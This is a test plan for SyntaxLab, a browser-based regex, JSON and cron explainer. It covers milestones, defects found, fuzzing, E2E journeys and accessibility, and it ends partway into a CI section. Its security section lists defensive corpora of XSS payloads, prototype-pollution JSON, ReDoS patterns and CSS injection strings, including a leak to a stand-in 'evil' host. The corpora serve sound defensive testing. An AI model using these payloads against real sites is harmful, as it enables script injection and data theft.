# 13 — Test Plan

**Project:** SyntaxLab
**Status:** Draft for human review
**Last updated:** 2026-08-17

---

> **Scope note.** **§§1–9 and §§11–13 are V1.0** (regex + JSON). **§10 is V1.1** (cron); §3.3 records what M14 actually built and what it deliberately did not. Share-URL tests are removed from V1.0 with the feature. Each test group names the milestone that introduces it, so the plan cannot drift from the implementation.

## 1. Strategy

The test pyramid is deliberately bottom-heavy, because the risk in this application is concentrated in pure logic (parsers, explanation, schedule computation) that is cheap to test exhaustively.

```
         ╱╲          E2E (~25)          user journeys, offline, PWA
        ╱  ╲         Integration (~60)  editor→parser→explanation, storage
       ╱    ╲        Component (~80)    rendering, interaction, a11y
      ╱______╲       Unit (~400)        parsers, explainers, validators
     ╱________╲      Property/fuzz      generative — the highest-value layer here
```

The **property/fuzz layer sits outside the pyramid** because it is not a size tier — it is a different kind of assurance. For a tool whose entire job is parsing hostile input, generative testing finds the bugs that example-based tests never will.

### Tests are introduced with their milestone

A test plan that is not tied to milestones becomes a wish-list written at the end. Each group below is introduced by the milestone that creates the code it covers:

| Milestone | Tests introduced |
|---|---|
| M1 | Store primitive; smoke render; lint/typecheck gates; **first bundle measurement** |
| M2 | Worker round trip, timeout → terminate → respawn, superseded responses, malformed payload rejection, `structuredClone` round trip |
| M3 | Regex tokenizer/parser/explainer units; regex golden corpus; regex property + differential |
| M4 | Regex component tests; I1–I4; E2; E12; axe on the regex view; render-count assertion |
| M5 | JSON scanner/parser units; JSONTestSuite conformance; JSON property + differential; prototype-pollution corpus |
| M6 | JSON component tests; I5–I7; E3; axe on the JSON view; virtualisation performance |
| M7 | Repository units; I10–I17, I22; storage security; E5; E10 |
| M8 | Theme validation units; theme-injection corpus; E6; no-flash assertion |
| M9 | E7, E8, E9; offline analysis for both modes; precache budget |
| M10 | Full security suite; full axe sweep; screen-reader pass; E17, E18 |
| M11 | Bundle budgets; Lighthouse gates; long-task audit; memory snapshots |
| M12 | Full E2E suite; cross-browser; manual checklist |
| **M14** | Cron units, golden corpus, refusal tests, property, the `analysis.cron` boundary — **146 cases, all green** |
| **M15–M16 (V1.1)** | Cron UI; DST matrix; I8, I9; E4 |

### Implemented at M1

| Suite | Count | Status |
|---|---|---|
| Unit (`vitest`) | **47** across 6 files | ✅ passing |
| E2E (`playwright`, production build) | **7** | ✅ passing |
| Accessibility (`axe-core`, in E2E) | 1 gate, all views at M1 | ✅ 0 critical/serious |

M1 unit coverage: the store primitive (reference-equality short-circuit,
unsubscribe-during-notify, isolation), `Result`/`DomainError` construction and
hostile-input truncation, `LIMITS` values and the debounce/manual-analysis
boundaries, `ModeSelector` radiogroup semantics and keyboard navigation, the
shell's landmark and live-region structure, and error-boundary recovery.

M1 E2E coverage: shell renders without a page error, product identity is
present, keyboard-only mode switching, **zero CSP violations**, **zero network
requests after load**, **zero critical/serious axe violations**, and no
horizontal scroll at a 360 px viewport.

**One real defect was found by these tests and fixed:** `--gray-400` failed
WCAG AA contrast (4.19:1 on surfaces against a 4.5:1 requirement). The
documented value had been calculated by hand and was wrong. See
`09_DESIGN_SYSTEM.md` §3.4.

### Implemented at M2

| Suite | Count | Status |
|---|---|---|
| Unit — protocol validation | 38 | ✅ passing |
| Unit — WorkerClient lifecycle | 22 | ✅ passing |
| E2E — real workers, **3 engines** | 10 × 3 = 30 | ✅ passing |
| **Total after M2** | **107 unit, 38 E2E** | ✅ |

Cross-browser matrix for the R-10 checkpoint:

| Behaviour | Chromium | Firefox | WebKit |
|---|---|---|---|
| Worker startup and round trip | ✅ | ✅ | ✅ |
| Concurrent requests, no crossed responses | ✅ | ✅ | ✅ |
| Work completes inside the deadline | ✅ | ✅ | ✅ |
| **Busy loop terminated at the deadline** | ✅ | ✅ | ✅ |
| **Replacement worker serves the next request** | ✅ | ✅ | ✅ |
| Settles at the deadline, not after the task | ✅ | ✅ | ✅ |
| Survives three consecutive timeouts | ✅ | ✅ | ✅ |
| **Analysis worker survives an execution timeout** | ✅ | ✅ | ✅ |
| **Main thread interactive while the worker is pinned** | ✅ | ✅ | ✅ |
| Capability detection reports availability | ✅ | ✅ | ✅ |

The unit suite uses a controllable Worker double: real workers cannot be
driven deterministically from a unit test, since timing is at the mercy of the
thread scheduler. Real workers are covered by the E2E matrix above.

### Implemented at M3

| Suite | Count | Status |
|---|---|---|
| Unit — tokenizer | 77 | ✅ |
| Unit — parser | 62 | ✅ |
| Unit — golden corpus | 170 | ✅ |
| Unit — edge cases | 61 | ✅ |
| Unit — differential vs `new RegExp` | 206 | ✅ |
| Property / fuzz | 19 properties | ✅ |
| Unit — protocol + client validation | +27 | ✅ |
| E2E — regex through the worker, ×3 engines | 15 | ✅ |
| **Total after M3** | **715 unit, 53 E2E** | ✅ |

**Golden corpus: 164 distinct human-reviewed patterns**, organised by grammar
area — literals, escapes, anchors, dot, character classes (including class
identity escapes), quantifiers, quantified groups, alternation, groups,
nesting, lookaround in context, backreferences, Unicode properties, flags,
astral characters, and realistic patterns. Plus malformed, foreign-dialect,
and warning cases asserted separately.

**Coverage of `src/domain/regex`: 97.70% statements, 90.85% branch** — above
the documented ≥95% gate.

**Defects found by these tests during M3** (all fixed, all pinned as
regressions):

| Found by | Defect |
|---|---|
| Differential | `\k<name>` rejected where the engine accepts it (Annex B) |
| Differential | `[a\-z]` rejected under `/u` |
| Differential | `\01` accepted under `/u` |
| Property (span containment) | empty group body anchored outside its parent |
| Parser unit test | groups reported in completion order, not source order |
| Golden review | `[\]]` read as "the escape", not as a literal |
| Golden review | multi-part lookaround body not bracketed, so its extent was ambiguous |
| Lint (exhaustiveness) | `analysis.regex` case missing from the worker dispatch |

### Implemented at M4

| Suite | Count | Status |
|---|---|---|
| Unit — regex execution semantics | 44 | ✅ |
| Unit — view models | 24 | ✅ |
| Unit — application orchestration | 20 | ✅ |
| Unit — exec protocol and result validation | 13 | ✅ |
| Unit — components, by role and accessible name | 25 | ✅ |
| Unit — golden corpus | 188 | ✅ |
| **Total after M4** | **859 unit, 146 E2E (3 skipped)** | ✅ |

**E2E: 24 tests × 4 targets** — Chromium, Firefox, WebKit and a mobile
viewport — against the **production** build, so the CSP and the real chunking
are in force. Covers the whole journey, flags, invalid patterns, foreign
dialects, timeout and recovery, XSS payloads, paste limits, keyboard
navigation, 360 px layout and axe.

**Three tests are skipped on WebKit**, with a measurement as the reason rather
than a shrug: JavaScriptCore bounds its own backtracking, so no pattern reaches
the deadline there (`04_PARSER_ARCHITECTURE.md` §2.9). Termination on WebKit is
proven at M2 against a busy loop, which is the stronger condition.

**Defects found by these tests during M4** (all fixed):

| Found by | Defect |
|---|---|
| axe (E2E) | A collapsible `<Panel>` rendered its title as a bare button, dropping the section from the document outline |
| axe (E2E) | Hint text inside a warning row measured 3.88:1 on the amber tint — below AA. It used the muted token, which is only measured against the panel surface. |
| Protocol unit test | `parseWorkerRequest` rebuilt the envelope field by field but passed the payload through by reference, so unknown wire keys did reach the worker |
| Component unit test | The explanation carried no positioned reference nodes, so the documented explanation-to-source link had nothing to attach to and `spanRef` was dead code |
| **Human review** | Four wording defects — see §below |

**The human review is the part a test suite cannot do.** Forty-five patterns
across every grammar area were read as a user would read them, and found four
defects that every existing test passed: escapes restating their own syntax
(`\x41` → "the character \x41"), a multi-member character class running into
the surrounding prose with no boundary, "any of a literal ]" as a sentence, and
`.` and `-` described two different ways in the same class. Fifteen fixtures
now pin the corrected wordings, each naming the defect it guards against.

### Implemented at M5

| Suite | Count | Status |
|---|---|---|
| Unit — JSON parser structure and errors | 59 | ✅ |
| Unit — differential vs `JSON.parse` | 166 | ✅ |
| Unit — golden corpus, human-reviewed | 68 | ✅ |
| Unit — prototype pollution and hostile content | 51 | ✅ |
| Unit — worker protocol, paths and numbers | 32 | ✅ |
| Property / fuzz | 17 properties | ✅ |
| E2E — JSON through the real worker, ×3 engines | 7 | ✅ |
| **Total after M5** | **1 252 unit, 167 E2E (3 skipped)** | ✅ |

**Coverage of `src/domain/json`: 97.5% statements, 91.0% branch** — above the
documented ≥95% gate.

**The differential suite states what it proves.** Validity and values against
`JSON.parse`, across a curated corpus and 4 000 generated and mutated
documents. It is explicitly silent on positions (the oracle has none), on
duplicate keys (we differ by design), and on diagnostic quality (we report
more, and more specifically, on purpose). Those are covered by unit and
property tests instead.

**Defects found by these tests during M5** (all fixed):

| Found by | Defect |
|---|---|
| Golden corpus | The scanner and the parser both reported `{a:1}`, so one mistake produced two errors |
| Coverage | `isValidJsonAnalysis` had no tests at all — 3% covered, on the module that stands between a malformed worker result and application state |
| Coverage | `EMPTY_STATS` was exported and imported by nothing |
| **Human review** | Eight wording defects — see below |

**The human review is the part a test suite cannot do.** Thirty documents
across every category were read as a user would read them. Eight defects, each
of which every existing test passed:

| Defect | Fix |
|---|---|
| The Structure section restated the summary verbatim | It now carries what the summary cannot: counts, depth, keys, size |
| "0 levels deep" for a bare scalar | Depth omitted where there is no nesting |
| The array breakdown repeated a homogeneous summary | Shown only for mixed arrays |
| `$` appeared raw in findings | "at the top level" where the path is empty |
| "keep them as strings" followed a negative zero and an overflow | Advice only where it applies |
| "the rest was read as a part that could not be read" | No recovery is claimed unless something substantive survived |
| ", and" joining a two-clause summary | Written out; `joinClauses` is right for three |
| "a single string, hello" | A colon reads better before a quoted value |

### Implemented at M6

| Suite | Count | Status |
|---|---|---|
| **JSONTestSuite conformance** | **644** | ✅ **J-2 passed** |
| Unit — JSON UI view models | 51 | ✅ |
| E2E — JSON workspace, ×4 targets | 32 | ✅ |
| **Total after M6** | **1 947 unit, 298 E2E (3 skipped)** | ✅ |

**J-2 is closed with evidence.** The published corpus is vendored under
`tests/fixtures/jsontestsuite/` with its MIT licence: 95/95 `y_` accepted,
188/188 `n_` rejected, 35 `i_` classified in the test as data. Every one of the
318 verdicts matches `JSON.parse` on the same decoded text.

**The corpus is checksummed, after a real incident.** A `prettier --write` run
over the repository reformatted the fixtures as ordinary JSON and *repaired*
twelve of them — `[2.e3]` became `[2e3]`, `["",]` became `[""]` — and the file
count was unchanged, so the count assertion passed while the suite had been
silently weakened. A SHA-256 manifest now guards the contents, and
`.prettierignore` excludes the directory. The manifest is the gate; the ignore
rule is the convention.

**Defects found by M6 testing** (all fixed):

| Found by | Defect |
|---|---|
| E2E | The auto-select rule keyed off the *target* editor being empty, so a mode could switch while the user was mid-edit |
| Unit | `\bword\b` detected as "unknown" — a shorthand escape is near-conclusive evidence of a pattern |
| Conformance | The corpus had been corrupted by a formatter (above) |
| **Manual review** | Three wording and marking defects — see below |

**The manual pass** read seventeen documents as a user would: small, deep,
mixed, long strings, Unicode, duplicate keys, precision loss, negative zero,
overflow, malformed, partial recovery, prototype-pollution and XSS payloads.

| Defect | Fix |
|---|---|
| The status line read "1 keys" and "1 values" | Singularised |
| Two duplicate occurrences on one line both read "line 1" | Line **and column**, so the jump targets differ |
| A node from error recovery was marked only by colour | It carries the words "could not be read" |

### Tooling

| Layer | Tool | Why |
|---|---|---|
| Unit / integration | **Vitest** | Native Vite integration, no separate build config, fast watch |
| Component | **React Testing Library** | Role-based queries; encourages accessible markup |
| Property / fuzz | **fast-check** | Mature, shrinking works, integrates with Vitest |
| E2E | **Playwright** | Real Chromium/Firefox/WebKit, offline emulation, service-worker support |
| Accessibility | **axe-core** via `@axe-core/playwright` and `jest-axe` | |
| Performance | **Lighthouse CI** + Playwright PerformanceObserver | |
| Coverage | **v8** via Vitest | |

---

## 2. Coverage targets

| Area | Line | Branch | Rationale |
|---|---|---|---|
| `domain/` | **95%** | **90%** | Pure logic, no excuse for gaps, highest risk |
| `application/` | 90% | 85% | Use-case orchestration |
| `infrastructure/` | 85% | 75% | Some browser paths need E2E instead |
| `features/`, `components/` | 75% | 65% | Diminishing returns on presentational code |
| **Overall** | **85%** | **80%** | CI gate |

Coverage is a floor, not a goal. A 95%-covered parser with no fuzz testing is less trustworthy than an 80%-covered one backed by differential testing.

**What the suite establishes, stated honestly.** We do not claim to test "all edge cases" — the input space is unbounded and the claim would be unfalsifiable. The suite produces *evidence*:

| Claim | Evidence |
|---|---|
| Agrees with the platform on validity | Differential testing across the fuzz corpus, with the corpus size reported in CI |
| Handles the published JSON conformance suite | JSONTestSuite results, reported per category |
| Terminates on every corpus input | Step-budget property assertion |
| Produces the reviewed explanation for these cases | Golden fixtures, human-reviewed on change |
| Handles these specific hostile inputs | Named security corpus |
| **Refuses unsupported input clearly** | Refusal tests — see §13.1 |

---

## 3. Unit tests

### 3.1 Regex domain (~150 cases)

**Tokenizer:** every token kind; escapes (`\d \w \s \b \n \x41 A \u{1F600} \cA \0`); char classes including ranges, negation, and nested `-`; all quantifier forms; all group forms; Annex B vs `/u` divergences; unterminated constructs.

**Parser:** precedence (`a|bc` vs `(a|b)c`); nesting depth; group numbering including nested and alternation cases; named groups and duplicates; forward and backward backreferences; error recovery for each recoverable error; the depth limit.

**Explainer:** every AST node type; context sensitivity (`.` at top level / with `s` / in a class; `^` as anchor / negation; `-` as range / literal); flag effects; the golden corpus.

**Golden corpus** — 150+ real patterns with reviewed explanation output:
```
^[A-Z][a-z]+$
^\d{3}-\d{2}-\d{4}$
(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})
^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$
\b(?:https?|ftp)://[^\s/$.?#].[^\s]*\b
(?<=\$)\d+(?:\.\d{2})?
^(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*)@…
(a+)+$                          ← ReDoS shape, must warn
\p{Script=Greek}+               ← requires /u
[\p{L}\p{N}]+                   ← unicode property class
```

### 3.2 JSON domain (~120 cases)

**Scanner:** all escapes; surrogate pairs; lone surrogates preserved; rejected control characters; every number form valid and invalid; deep nesting; empty containers; whitespace variants including the four legal whitespace characters and no others.

**Parser:** the RFC 8259 conformance suite (the JSONTestSuite corpus — `y_*` must accept, `n_*` must reject, `i_*` documented either way); error recovery; multiple errors; the depth limit; the node limit; duplicate keys; unsafe numbers; key-order preservation with integer-like keys.

**Differential:** for every generated and corpus input, our validity verdict must equal `JSON.parse`'s. Any disagreement is our bug. This single test is worth more than the rest of the JSON suite combined.

**Formatting:** prettify at 2/4/tab; minify; round-trip idempotence; raw number text preserved (`1e5` stays `1e5`); formatting a partially-invalid document does not throw.

### 3.3 Cron domain — **V1.1; 146 cases built at M14**

> **Built at M14: 146 unit cases.** Not part of the V1.0 suite. The three groups below marked *M16* need the schedule executor and have no tests yet, because there is nothing to test.

| Suite | Cases | Status |
|---|---|---|
| `tests/unit/cron/parser.test.ts` — grammar, the 5-field lock, limits | 33 | ✅ |
| `tests/unit/cron/semantics.test.ts` — OR rule, Sunday convention, timezone across six real zones, spans including UTF-16 edge cases | 33 | ✅ |
| `tests/unit/cron/corpus.test.ts` — the golden corpus: **59 hand-written expressions**, 27 valid, 24 invalid, 8 from other schedulers | 78 | ✅ |
| `tests/unit/cron/property.test.ts` — 11 fast-check properties at 1 200 runs each, fixed seed 20260821, plus 2 deterministic structural checks | 13 | ✅ |
| `tests/unit/protocol.test.ts` — the `analysis.cron` boundary | 22 | ✅ |

Coverage is not the interesting number here; the corpus is. Every corpus case was read by a person and its expectation written by hand, which is what makes it a golden corpus rather than a snapshot: a change that quietly alters behaviour has to be argued with rather than absorbed.

**Field parsing:** every field's range boundaries; names (`JAN`, `mon`, mixed case); lists, ranges, steps, and combinations; `0` and `7` for Sunday; invalid values; inverted ranges; zero/negative steps.

**Refusal tests — as important as the parsing tests.** Unsupported input must be refused clearly, and that behaviour is specified, so it is tested:

| Input | Expected |
|---|---|
| `0 0 12 * * ?` (6 fields) | Refusal naming the 5-field format; **no parse attempted**; mentions seconds-first and year conventions |
| `0 0 12 * * ? 2026` (7 fields) | Refusal |
| `0 0 L * *` | Refusal naming Quartz |
| `0 0 15W * *` | Refusal naming Quartz |
| `0 0 * * 5#3` | Refusal naming Quartz |
| `H 0 * * *` | Refusal naming Jenkins |
| `0 0 * *` (4 fields) | "Expected 5 fields, got 4" |
| `rate(5 minutes)` | Refusal naming AWS EventBridge |

Assertion for every row: the message is specific, no schedule is produced, and **no next-run time is displayed**.

**Schedule computation — *M16*.** Next run for every preset; month and year rollover; leap years across 4/100/400 boundaries; unsatisfiable schedules terminating with the correct message; the 5-year search bound. None of this is tested at M14 because none of it is built (`04_PARSER_ARCHITECTURE.md` §4.4).

**The DOM/DOW OR-rule *is* tested at M14**, as a warning and an explanation rather than as matching: both fields restricted warns and says "either, not both" in words; one field restricted does not; neither does not; and a full-range list such as `1-31` counts as unrestricted, which is its own regression test.

**Timezone — reduced scope (browser-local and UTC only).** At M14 the tests are about *representation*, not about times, because no times are computed. UTC resolves to a zero offset and `userSelection`; browser-local reports `browserResolvedOptions` and a non-empty zone name; the DST caveat appears when — and only when — the browser's zone actually transitions, checked against six real zones by setting `process.env.TZ`, which `Date` honours at runtime in Node; and every analysis carries a `cron-timezone` section, which is invariant C-I1 at the only level M14 can hold it.

**Named-zone selection is not implemented, so it is not tested for correctness — it is tested for absence.** Two separate tests assert that no analysis, in either mode, can produce a third timezone mode. If someone widens the union, those fail. The transition matrix across zone types (spring-forward skip, fall-back repeat, southern hemisphere, `Asia/Kolkata`'s half-hour offset, a no-DST zone) belongs to M16 with the executor.

**Golden corpus** — 100+ expressions with reviewed English output.


### 3.3.1 Differential and reference testing for cron — *why there is no oracle*

Regex is tested differentially against `new RegExp`, and JSON against `JSON.parse`. Both are legitimate oracles because both are **the same specification we implement**: if we disagree with the platform about whether a document is valid JSON, we are wrong.

**Cron has no such oracle, and using one anyway would be a mistake.** There is no cron standard in the sense that ECMA-262 and RFC 8259 are standards. Vixie cron, cronie, croniter, Quartz, Jenkins and AWS EventBridge legitimately differ — in field count, in symbols, in step semantics, and in DST policy. A reference implementation would not be measuring our correctness; it would be measuring our agreement with one project's choices, and disagreement would be evidence of nothing.

**What that means in practice:**

| | Decision |
|---|---|
| Reference implementation as an oracle | **Not used.** No cron dependency is installed (`16_DEPENDENCIES.md` §6, and the M14 brief's dependency discipline). |
| Where a reference *is* consulted | As documentation, for the two places we had to choose a reading — the `n/m` step base and the DOM/DOW rule. Both are documented Vixie/cronie behaviour, and both are named in the output rather than applied silently. |
| What plays the oracle's role instead | The **golden corpus**: 59 expressions whose expected answers are judgements written by hand, not derivations. |

**Where a comparison would be invalid, stated exactly.** If a reference implementation were ever wired in, these are the axes on which a disagreement would prove nothing about our correctness:

| Axis | Why comparison is invalid |
|---|---|
| Field count | Quartz and Spring accept 6 and 7 fields. We refuse them **by design**. A reference that parses `0 0 12 * * ?` is not showing us a bug. |
| `L`, `W`, `#`, `?`, `H` | Quartz and Jenkins extensions. We recognise them only in order to name the scheduler and refuse. |
| `n/m` step base | Vixie and cronie read it as `n-max/m`; others reject it. We match Vixie/cronie **and say so in the warning**. A stricter reference would disagree, correctly, from its own position. |
| DST resolution | Schedulers differ on skipped and repeated wall-clock times. We do not claim parity with any of them (`05_SECURITY.md` §16, RR-09). |
| Diagnostics | We report per-field errors with spans and hints. Most implementations report the first error or none. More diagnostics is not a disagreement about semantics. |
| Timezone | We support two modes. Any reference supporting named zones is answering a different question. |

**The comparable properties, if a reference is ever added**, are narrow and worth stating so the temptation to compare more is resisted: for a 5-field expression using only `*`, values, lists, ranges and `*/n` or `a-b/n` steps, the **resolved value set of each field** should be identical. That is the intersection of every dialect listed above, and it is exactly the part of the model that has no room for interpretation.

**The group that keeps this honest today** is the third block of the golden corpus: eight expressions that are valid in *another* scheduler, each asserted to be refused *and* to name the scheduler it came from. If those ever start parsing, SyntaxLab has become dialect-agnostic by accident — which is the specific failure a naive differential suite would have encouraged.

### 3.4 Shared and infrastructure

Detection (each type, ambiguous cases, empty, confidence thresholds); limits enforced at all three layers; `Result` helpers; theme validation (valid hex, invalid hex, injection strings, out-of-range numbers, unknown keys); history repository CRUD, query, dedupe, prune, quota, corruption; migrations from every prior fixture; import/export round-trip. **(Share codec tests are removed with the deferred feature.)**

---

## 4. Property and fuzz tests

The highest-value layer. Target: **100 000 generated cases per parser per CI run**, with a fixed seed for reproducibility plus a rotating seed for discovery.

### 4.1 Universal parser properties

```ts
// Never throws
fc.assert(fc.property(fc.string({ maxLength: 10_000 }), (s) => {
  expect(() => parseRegex(s)).not.toThrow();
}));

// Always terminates within a step budget
fc.assert(fc.property(fc.string({ maxLength: 10_000 }), (s) => {
  const { steps } = parseRegexInstrumented(s);
  expect(steps).toBeLessThan(s.length * 100);
}));

// Spans are well-formed and properly nested
fc.assert(fc.property(fc.string(), (s) => {
  const r = parseRegex(s);
  if (r.ok) expectValidSpans(r.value.ast, s.length);
}));

// Differential: we agree with the platform on validity
fc.assert(fc.property(fc.string({ maxLength: 500 }), (s) => {
  let native = true; try { new RegExp(s, 'u'); } catch { native = false; }
  expect(parseRegex(s, { unicode: true }).ok).toBe(native);
}));
```

### 4.2 Structured generators

Random strings mostly produce invalid input, which tests only the error paths. Structured generators produce *valid but unusual* input, which is where correctness bugs hide:

- **Regex:** a recursive arbitrary building valid patterns from the grammar — nested groups, alternations, quantifiers, classes, backreferences
- **JSON:** `fc.jsonValue()` plus a serialiser producing unusual-but-valid formatting (odd whitespace, deep nesting, extreme numbers, escape-heavy strings)
- **Cron *(V1.1)*:** valid field values composed into 5-field expressions, plus generated 6- and 7-field expressions asserted to be **refused**, never parsed

### 4.3 Round-trip properties

```
JSON:  parse → format → parse  ⇒ structurally identical
JSON:  parse → minify → parse  ⇒ structurally identical
Export:export → import         ⇒ identical entries
Cron:  parse → toString → parse⇒ identical schedule   (V1.1)
```

### 4.4 Failure handling

Every counterexample fast-check finds becomes a **permanent named unit test**. The fuzzer finds it once; the regression suite keeps it found.

---

## 5. Integration tests

| # | Flow | Assertions |
|---|---|---|
| I1 | Type regex → analysis appears | Debounce respected; worker called once; explanation rendered |
| I2 | Type invalid regex → error | Error position accurate; editor marker present; no crash |
| I3 | Regex + test string → matches | Highlights at correct offsets; group values correct |
| I4 | Catastrophic regex → timeout | Timeout state within ~2 s; UI responsive throughout; worker respawned; the next test works |
| I5 | Paste JSON → tree | Tree structure matches; paths correct; stats correct |
| I6 | Invalid JSON → error report | Line/column exact; jump-to-position works |
| I7 | Format → minify → format | Content preserved |
| I8 | *(V1.1)* Cron → next runs | Times correct in the selected mode; **zone label on every row**; 6-field input refused |
| I9 | *(V1.1)* Switch browser-local ↔ UTC | Next runs recompute; labels update |
| I10 | Analysis → history | Entry created with correct title and metadata |
| I11 | History → restore | Input restored exactly; analysis recomputes; `lastOpenedAt` updated |
| I12 | Pause history → analyse | Nothing written |
| I13 | Theme change → reload | Persisted and applied pre-paint |
| I14 | Export → clear → import | Entries restored identically |
| I15 | Quota exceeded | Prune, retry, notify, disable auto-capture |
| I16 | Storage unavailable | Memory mode; app fully functional; notice shown |
| I17 | Corrupted records | Quarantined; list still renders |
| I18 | Worker fails to start | Fallback mode; regex execution disabled with an explanation |
| I19 | First-run history notice | Appears once, before any save; "Turn history off" disables capture immediately; does not reappear |
| I20 | Mode switch | Input preserved per mode; correct chunk loaded |
| I21 | Detection | Suggestion appears; override works; dismissal sticks |
| I22 | Two tabs | History change propagates via BroadcastChannel |

---

## 6. End-to-end tests

Playwright, against a production build, on Chromium (all), Firefox and WebKit (critical path only).

| # | Journey |
|---|---|
| E1 | Open app → empty state → click a regex example → explanation appears |
| E2 | Full regex journey: type, flags, test string, matches, copy |
| E3 | Full JSON journey: paste, tree, expand, copy path, format |
| E4 | *(V1.1)* Full cron journey: preset, timezone switch, next runs, builder, 6-field refusal |
| E5 | Analyse → open history → restore → verify |
| E6 | Customise theme → reload → theme persists, **no flash** |
| E7 | **Offline:** load, go offline, reload, both analyses work (three from V1.1) |
| E8 | **PWA:** SW registers, precache populated, manifest valid |
| E9 | Update flow: new SW → banner → no auto-reload → accept → content preserved |
| E10 | Export → clear → import → verify |
| E11 | Keyboard-only: complete a full analysis without a mouse |
| E12 | ReDoS: paste catastrophic pattern → timeout state → UI responsive during |
| E13 | Oversized input → clean rejection |
| E14 | Clipboard sharing: copy input, copy explanation, copy JSON path; assert `text/plain` only |
| E15 | Mobile viewport: tabs work, drawers full-screen, no horizontal scroll |
| E16 | 200% zoom: no horizontal scroll, everything reachable |
| E17 | **Network silence:** intercept all requests; assert zero after load |
| E18 | CSP: assert header; fail on any violation event |
| E19 | Error boundary: force a panel crash; assert other panels survive and input is preserved |
| E20 | Reduced motion: assert transitions disabled |

E7, E12, and E17 are the three tests that verify the product's headline claims. If any of them fails, the release does not ship regardless of everything else.

---

## 7. Security tests

Every payload in `tests/security/payloads/` is driven through **every V1.0 input surface**: regex pattern, test subject, JSON body, JSON key, history title, and imported file. Cron fields are added at M15, with the input surface that makes them pasteable. **Share URLs are not a surface in V1.0.**

### 7.1 XSS

```
<script>window.__xss=1</script>
<img src=x onerror="window.__xss=1">
<svg/onload="window.__xss=1">
javascript:window.__xss=1
"><script>window.__xss=1</script>
<iframe src="javascript:window.__xss=1">
{{constructor.constructor('window.__xss=1')()}}
<style>@import 'http://evil'</style>
<a href="data:text/html,<script>window.__xss=1</script>">
<script>window.__xss=1</script>
<div id="x"></div><script>…</script>   ← mXSS-style broken markup
```

Assertions after each: `window.__xss` is `undefined`; the payload is present as visible **text**; no `<script>` element was created; no CSP violation fired.

### 7.2 Prototype pollution

```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
{"__proto__": {"toString": "boom"}}
{"a": {"__proto__": {"polluted": true}}}
[{"__proto__": {"polluted": true}}]
```
Through: JSON parse, import, preference load. Assert `({}).polluted === undefined` and `Object.prototype.polluted === undefined` after each.

### 7.3 ReDoS
```
(a+)+$                      with "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
(a|a)*$                     with the same
([a-zA-Z]+)*$
(a|b|ab)*c                  with 30 chars
^(([a-z])+.)+[A-Z]([a-z])+$
nested {1,1000} repetitions
```
Assert: timeout state within ~2.5 s; the main thread stayed responsive (a click during execution is handled); the worker was terminated and respawned; the next execution succeeds.

### 7.4 Oversized and pathological input
Regex at 10 001 chars; test subject at 1 MB + 1; JSON at 5 MB + 1; JSON nested 501 deep; JSON with 500 001 nodes; a 1 MB single JSON string; a 20 MB + 1 import file. *(A 1 001-char cron expression is covered at M14, in `tests/unit/cron/parser.test.ts`: `LIMIT_EXCEEDED`, refused before tokenising.)* Assert: clean rejection with a specific message; no crash; no hang.

### 7.5 Storage tampering
Pre-seed IndexedDB with: a record missing required fields; wrong types; `schemaVersion: 99`; a 10 MB input string; a prototype-polluting record; an XSS payload in `title`. Assert: quarantine or safe render; list still works; no crash; no execution.

### 7.6 Theme injection
```
--gradient-from: red; background: url(https://evil/?leak=
#00ff88; } body { display: none } .x {
expression(alert(1))
url(javascript:alert(1))
```
Assert: rejected by the hex allowlist; defaults applied; no CSS rule created.

### 7.6a Theme hue (M10 correction pass)

Green is a *theme* hue, not a global ban: it stays in the green family and in
the semantic success colour. What must not happen is green appearing as
decoration in a theme that did not ask for it.

Measured rather than grepped, because the leak — `#101613`, `#3ddc84` — never
contained the word "green":

| Check | Scope |
|---|---|
| `npm run audit:hues` | Static: every `var()` chain in `tokens.css` resolved to a literal and classified |
| `npm run audit:themes` | Runtime: each preset selected in Chromium, every decorative token read at its *used* value |
| `tests/unit/theme/families.test.ts` | Shared ramp neutral; syntax palette green-free; regex hues ≥ 15° apart; families declared, persisted, and repaired when corrupt |
| `tests/e2e/theme.spec.ts` | Per-preset runtime assertion across all four non-green families, Matrix's four colours, and the editor decorations under Crimson Night |

A near-neutral is judged on channel bias, a saturated colour on hue alone —
`#101613` is green at a spread of 6, and `#f1fa8c` has more green than red and
is a yellow.

### 7.7 Malicious import
Wrong MIME and extension; a valid JSON file that is not an export; version 999; 100 000 entries; a deeply nested envelope; a prototype-polluting envelope. Assert: specific rejection message; no partial import; no hang.

---

## 8. Accessibility tests

### Automated
`axe-core` on every primary view and every drawer/dialog, in both contrast modes, at 100% and 200% zoom. **Gate: zero critical or serious violations.** Plus keyboard-only navigation of every flow via Playwright, and a focus-order snapshot test.

### Manual, before release
| Check | Method |
|---|---|
| Screen reader — full flow | NVDA + Firefox; VoiceOver + Safari |
| Announcement quality | Results announce a useful summary, not token soup; not spammy while typing |
| Focus management | Drawers/dialogs trap and restore correctly |
| Editor accessibility | CM6 usable with a screen reader; escape route from the tab trap documented and working |
| Colour independence | Greyscale screenshot review — all status still legible |
| Colour-vision deficiency | Deuteranopia/protanopia/tritanopia simulation of the syntax palette |
| Contrast | Automated check of every default pair, plus the live checker for custom themes |
| Zoom / reflow | 200% and 400%, 320 px width |
| Reduced motion | OS setting honoured |

---

## 9. Performance tests

Per `12_PERFORMANCE.md` §8. In CI: bundle budgets, Lighthouse gates, long-task detection, parser microbenchmarks with a 20% regression gate, and the render-count assertion on the typing path.

---

## 10. Compatibility matrix

| Browser | Support | Tested |
|---|---|---|
| Chrome/Edge (last 2) | Full | Automated + manual |
| Firefox (last 2) | Full | Automated + manual |
| Safari 16.4+ | Full | Automated (WebKit) + manual |
| Safari 15–16.3 | Degraded: no regex lookbehind in the *engine* — reported as a compatibility note on affected patterns | Manual |
| Chrome Android | Full | Manual |
| Safari iOS 16.4+ | Full; storage eviction caveat | Manual |
| IE / legacy Edge | Unsupported | — |

Feature detection with graceful degradation for: `CompressionStream`, `Intl.supportedValuesOf`, `navigator.storage.persist`, `BroadcastChannel`, `crypto.randomUUID` (a small UUID v4 fallback using `crypto.getRandomValues`), `structuredClone`, `color-mix()`.

---

## 11. CI pipeline

```yaml
on: [push, pull_request]
jobs:
  quality:      # typecheck · eslint · stylelint · prettier --check
  unit:         # vitest run --coverage  (gate: 85% / 80%)
